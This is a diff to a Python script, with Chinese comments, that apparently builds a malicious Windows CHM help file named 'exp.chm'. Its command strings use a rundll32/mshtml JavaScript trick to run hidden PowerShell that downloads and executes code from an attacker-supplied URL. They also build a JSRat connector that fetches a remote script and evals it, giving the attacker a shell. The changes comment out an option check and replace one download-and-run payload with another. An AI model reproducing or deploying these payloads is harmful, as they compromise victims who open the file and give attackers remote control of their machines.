@@ -21,9 +21,9 @@ parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000', defaul
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
 args=parser.parse_args()
 
-if args.payload is not None and args.rshell is not None and args.jsrat is not None:
-    print '-p 或 -r 或 -j 只能选一个'
-    sys.exit(0)
+# if args.payload is not None and args.rshell is not None and args.jsrat is not None:
+    # print '-p 或 -r 或 -j 只能选一个'
+    # sys.exit(0)
 
 if len(sys.argv) < 1:
     sys.exit(1)
@@ -40,7 +40,9 @@ if args.rshell is not None:
     # command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;''' + args.rshell + '''&#39;));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
     # windows8 測試通過，windows7 不通過
 
-    command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring("''' + args.rshell + '''"));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
+    # command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring("''' + args.rshell + '''"));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
+
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;'+args.rshell+'&#39;));&cmd /c taskkill /f /im rundll32.exe",0,true);'
     
 if args.jsrat is not None:
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
